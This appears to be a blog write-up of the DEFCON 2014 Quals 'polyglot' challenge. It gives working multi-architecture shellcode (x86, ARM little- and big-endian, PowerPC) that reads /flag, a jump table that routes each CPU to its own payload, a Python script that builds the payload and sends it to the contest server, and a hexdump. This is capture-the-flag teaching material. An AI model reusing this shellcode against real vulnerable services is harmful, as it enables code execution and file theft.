---
layout: post
title: "DEFCON 2014 Quals : polyglot"
description: ""
category: writeups
tags:
- defconquals
- defconquals2014
- 2014
- gynophage
- writeup
---
<!--{% include JB/setup %}-->

<a href="polyglot"></a>

### Gynophage 4 - Polyglot

    Just open /flag, and write it to stdout. How hard could it be?

    polyglot_9d64fa98df6ee55e1a5baf0a170d3367.2014.shallweplayaga.me 30000 

    Password: w0rk_tHaT_tAlEnTeD_t0nGu3

When we connect and supply the password, we see

    Give me shellcode.  You have up to 0x1000 bytes.  All GPRs are 0.  PC is 0x41000000.  SP is 0x42000000.

If we send garbage, we see
    
    Throwing shellcode against linux26-x86.(http://services.2014.shallweplayaga.me/polyglot_9d64fa98df6ee55e1a5baf0a170d3367)

Then,

    Didn't send back the right value.  Fail.

Our objective was to print out `/flag` on each target machine. We found [some shellcode to print out a file](http://www.shell-storm.org/shellcode/files/shellcode-73.php), and modified it to print `/flag` instead. 

    "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"+\
    "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"+\
    "\x80\x89\xc6\xeb\x06\xb0\x01\x31"+\
    "\xdb\xcd\x80\x89\xf3\xb0\x03\x83"+\
    "\xec\x01\x8d\x0c\x24\xb2\x01\xcd"+\
    "\x80\x31\xdb\x39\xc3\x74\xe6\xb0"+\
    "\x04\xb3\x01\xb2\x01\xcd\x80\x83"+\
    "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"+\
    "\xff/flag\x00\x00"

If we send this shellcode raw to the service, we advance to the next level:

    Throwing shellcode against linux26-armel.(http://services.2014.shallweplayaga.me/polyglot_6a3875ce36a55889427542903cd43893)

In the end, we needed to devise shellcode to work on Linux on x86, ARMEL (little-endian), ARMEB (big-endian), and PPC. The strategy we used was to assemble a series of jumps so that each architecture would take a different jump to its own shellcode. In other instruction encodings, they must be legal, not alter control flow, and not cause illegal memory accesses. However, we don't need to worry about instructions after each jump for a given architecture. 

          o
         / \
        /\ x86
      PPC \
          /\
     ARMEL  ARMEB
    
x86's variable width instructions caused the greatest trouble. In particular, the middle two bytes of the PPC branch instructions of the form `48 00 XX XX` were interpreted in x86 as arithmetic with a register dereference. Since all GPRs were zero, this caused a segmentation fault on x86. So, we put the x86 jump in front followed by the remainder of the jumps. 

The branch part of our shellcode was:

           73 12 00 00 | 48 00 01 70 | 9a 00 00 40 | 13 00 00 ea
    x86    jmp 0x14    | <bypassed>  | <bypassed>  | <bypassed>
    PPC    andi  ...   | b 0x174     | <bypassed>  | <bypassed>
    ARMEB  tstvc ...   | stmdami ... | bls 0x110   | <bypassed>
    ARMEL  andeq ...   | andvc   ... | mulmi ...   | b 0x60

Graphically:

             X
            / \
    1      X  jmp
          / \   \
    2    X   b   x86
        / \   \
    3  X   bls PPC 
        \   \
    4    b   ARMEB
          \
           ARMEL

Then, we placed shellcode for x86 at 0x14, ARMEL shellcode at 0x60, ARMEB shellcode at 0x110, and PPC shellcode at 0x174. The x86 shellcode we used is described above. 

Our custom shellcode opened `/flag`, read it into the BSS section, wrote it to stdout, then exited. We used the same shellcode source for ARMEL and ARMEB:

    shellcode:
        add r0, pc, #(filename-shellcode-8)

        mov r7, #5
        mov r1, #0
        svc #0
        mov r0, a1

        mov r7, #3
        mov r3, #0x16000
        mov r1, r3
        mov r2, #4096
        svc #0
        mov r2, a1

        mov r7, #4
        mov r0, #1
        mov r1, r3

        svc #0

        mov r7, #1
        mov r0, #0
        svc #0

    filename:
        .string "/flag" 

We compiled this for ARMEL and ARMEB separately and used dd to copy out the text sections into raw binary files.

Our PPC shellcode is below. We had to hardcode the address of the BSS section of the provided binary by loading 0x1001 into r4, shifting it left 16 bytes, then loading the lower 2 bytes.

    shellcode:
        li      0, 5
        li      3, 0x41
        slwi    3, 3, 24
        addi    3, 3, (filename-shellcode+0x174)
        li      4, 0
        li      5, 0
        sc

        nop
        li      0, 3
        mr      3, 3
        li      4, 0x1001
        slwi    4, 4, 16
        ori     4, 4, 0x5a74
        li      5, 2048
        sc  

        nop
        mr      5, 3    
        li      0, 4
        li      3, 1
        li      4, 0x1001
        slwi    4, 4, 16
        ori     4, 4, 0x5a74
        sc  

        li      0, 1
        li      3, 0
        sc
        
    filename:
        .string "/flag"

We used a Python script to handle the assembly of the combined binary and the interaction with the server. `shellcode-ppc` was compiled manually on a different machine and moved over before each run. This is the script we used:

    import sys
    import os
    import time
    from sock import *

    # dd for files!
    def os_dd(dst, src, skip=0, seek=0, count=0):
        print "dd'ing", dst, "to", src, "skip", skip, "seek", seek
        cmd = 'dd if=%s of=%s skip=%d seek=%d bs=1'%(src,dst, skip,seek)
        if count: cmd += ' count='+str(count)
        os.system(cmd)

    # dd for lists!
    def dd(dst, src, skip=0, seek=0, count=None):
        if not count: count = min(len(dst)-seek, len(src)-skip)
        for i in range(count): dst[seek+i] = src[skip+i]
        return dst

    X86_SIZE = 0x4c
    def get_x86_shellcode():
        shellcode = ''

        # world's shortest nopsled
        shellcode += "\x90"*4

        shellcode += "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"+\
                     "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"+\
                     "\x80\x89\xc6\xeb\x06\xb0\x01\x31"+\
                     "\xdb\xcd\x80\x89\xf3\xb0\x03\x83"+\
                     "\xec\x01\x8d\x0c\x24\xb2\x01\xcd"+\
                     "\x80\x31\xdb\x39\xc3\x74\xe6\xb0"+\
                     "\x04\xb3\x01\xb2\x01\xcd\x80\x83"+\
                     "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"+\
                     "\xff"+\
                     "/flag\x00\x00"
        open('shellcode-x86.bin','w').write(''.join(shellcode))
        return shellcode


    ARMEL_START_OFFSET = 0x60
    def get_armel_shellcode():
        os.system('arm-linux-gnueabi-as shellcode-arm.s -o shellcode-armel')
        os_dd('shellcode-armel.bin','shellcode-armel', skip=52, count=0x50)
        return open('shellcode-armel.bin').read()

    ARMEB_START_OFFSET = 0x110
    def get_armeb_shellcode():
        os.system('arm-linux-gnueabi-as -mbig-endian shellcode-arm.s -o shellcode-armeb')
        os_dd('shellcode-armeb.bin','shellcode-armeb', skip=52, count=0x50)
        return open('shellcode-armeb.bin').read()

    PPC_START_OFFSET = 0x174
    def get_ppc_shellcode():
        # no compilation here yet
        os_dd('shellcode-ppc.bin','shellcode-ppc', skip=52, count=0x6e)
        return open('shellcode-ppc.bin').read()

    def get_branch():
        # x86 jump
        r = '\x73\x12\x00\x00'
        # PPC branch
        r += '\x48\x00\x01\x70'
        # ARMEL branch
        r += '\x9a\x00\x00\x40'
        # ARMEB branch
        r += '\x13\x00\x00\xea'
        return r

    def assemble():
        shellcode = ['X']*1024
        pc = 0
        branch = get_branch()
        shellcode = dd(shellcode, branch)
        pc = len(branch)
        shellcode = dd(shellcode, get_x86_shellcode(), seek=pc)
        pc = ARMEL_START_OFFSET
        shellcode += 'X' * (pc - len(shellcode))
        print "pc is now", pc
        shellcode = dd(shellcode, get_armel_shellcode(), seek=pc)
        pc = ARMEB_START_OFFSET
        shellcode += 'X' * (pc - len(shellcode))
        shellcode = dd(shellcode, get_armeb_shellcode(), seek=pc)
        pc = PPC_START_OFFSET
        shellcode += 'X' * (pc - len(shellcode))
        shellcode = dd(shellcode, get_ppc_shellcode(), seek=pc)
        open('shellcode-assembled','w').write(''.join(shellcode))
        return shellcode

    def test_live():
        con = Sock("polyglot_9d64fa98df6ee55e1a5baf0a170d3367.2014.shallweplayaga.me 30000")
        con.send_line('w0rk_tHaT_tAlEnTeD_t0nGu3')
        sys.stdout.write(con.read_one()+'\n\n')
        time.sleep(0.5)
        con.send(''.join(assemble()))
        while 1:
            sys.stdout.write(con.read_one(15))

    test_live()

The resulting assembled shellcode looks like: 

    00000000  73 12 00 00 48 00 01 70  9a 00 00 40 13 00 00 ea  |s...H..p...@....|
    00000010  90 90 90 90 31 c0 31 db  31 c9 31 d2 eb 32 5b b0  |....1.1.1.1..2[.|
    00000020  05 31 c9 cd 80 89 c6 eb  06 b0 01 31 db cd 80 89  |.1.........1....|
    00000030  f3 b0 03 83 ec 01 8d 0c  24 b2 01 cd 80 31 db 39  |........$....1.9|
    00000040  c3 74 e6 b0 04 b3 01 b2  01 cd 80 83 c4 01 eb df  |.t..............|
    00000050  e8 c9 ff ff ff 2f 66 6c  61 67 00 00 58 58 58 58  |...../flag..XXXX|
    00000060  40 00 8f e2 05 70 a0 e3  00 10 a0 e3 00 00 00 ef  |@....p..........|
    00000070  00 00 a0 e1 03 70 a0 e3  16 3a a0 e3 03 10 a0 e1  |.....p...:......|
    00000080  01 2a a0 e3 00 00 00 ef  00 20 a0 e1 04 70 a0 e3  |.*....... ...p..|
    00000090  01 00 a0 e3 03 10 a0 e1  00 00 00 ef 01 70 a0 e3  |.............p..|
    000000a0  00 00 a0 e3 00 00 00 ef  2f 66 6c 61 67 00 00 00  |......../flag...|
    000000b0  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    *
    00000110  e2 8f 00 40 e3 a0 70 05  e3 a0 10 00 ef 00 00 00  |...@..p.........|
    00000120  e1 a0 00 00 e3 a0 70 03  e3 a0 3a 16 e1 a0 10 03  |......p...:.....|
    00000130  e3 a0 2a 01 ef 00 00 00  e1 a0 20 00 e3 a0 70 04  |..*....... ...p.|
    00000140  e3 a0 00 01 e1 a0 10 03  ef 00 00 00 e3 a0 70 01  |..............p.|
    00000150  e3 a0 00 00 ef 00 00 00  2f 66 6c 61 67 00 00 00  |......../flag...|
    00000160  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    00000170  58 58 58 58 38 00 00 05  38 60 00 41 54 63 c0 0e  |XXXX8...8`.ATc..|
    00000180  38 63 01 dc 38 80 00 00  38 a0 00 00 44 00 00 02  |8c..8...8...D...|
    00000190  60 00 00 00 38 00 00 03  38 60 00 03 38 80 10 01  |`...8...8`..8...|
    000001a0  54 84 80 1e 60 84 5a 74  38 a0 08 00 44 00 00 02  |T...`.Zt8...D...|
    000001b0  60 00 00 00 7c 65 1b 78  38 00 00 04 38 60 00 01  |`...|e.x8...8`..|
    000001c0  38 80 10 01 54 84 80 1e  60 84 5a 74 44 00 00 02  |8...T...`.ZtD...|
    000001d0  38 00 00 01 38 60 00 00  44 00 00 02 2f 66 6c 61  |8...8`..D.../fla|
    000001e0  67 00 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |g.XXXXXXXXXXXXXX|
    000001f0  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
    *
    00000400
